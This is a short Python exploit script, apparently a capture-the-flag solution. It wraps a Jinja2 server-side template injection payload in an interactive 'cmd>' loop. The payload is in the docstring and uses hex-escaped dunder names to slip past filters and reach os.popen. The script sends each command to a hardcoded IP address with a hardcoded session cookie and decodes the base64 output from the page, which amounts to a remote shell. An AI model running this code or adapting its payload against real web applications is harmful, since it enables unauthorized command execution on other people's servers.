#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup
from base64 import b64decode

"""
Payload:

{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')(request.args['cmd'] + ' | base64')|attr('read')()}}
"""

def run_cmd(cmd: str):
    req = requests.get("http://195.19.98.103:5000/tickets/b506e809d4484197f4b85f0a1db9fe72",
            params={'cmd': cmd},
            cookies={'session': '.eJztlbGOwjAQRH9l2ToFVkLCReIXqK5AQght7HUcJdgnrykQyr-fmyspKK44natp3sxI08wTr3YhcSzYn58IKQveWIRGxgo_HSW4C0dPN4ZJgJbIZB6QaGZfwdfCJAzahZCFfEiOI17W6rej_CxgQ4TI4ySJ4-THzQt40jMncCQwMHvQuTWx-a_wW9OVnQtc4AIX-I_Blwq1RHtNIX8r9rita7NXzQfv9rqtrW2azqqh60hpZVTd7myrSZHJoT8XjX0uHLLXnI6LHg8HXNdvs1C5mg.YEnbxQ.xLl7jDKdQuYbmgJIPDBifLBLd1g'}
            )
    if req.status_code != 200:
        print(f'Error! {req.status_code}')
        return

    soup = BeautifulSoup(req.text, 'lxml')
    output = soup.find('div', {'class': 'card-header'}).text
    return b64decode(output).decode()

if __name__ == '__main__':
    while True:
        cmd = input("cmd> ")
        output = run_cmd(cmd)
        print(output)
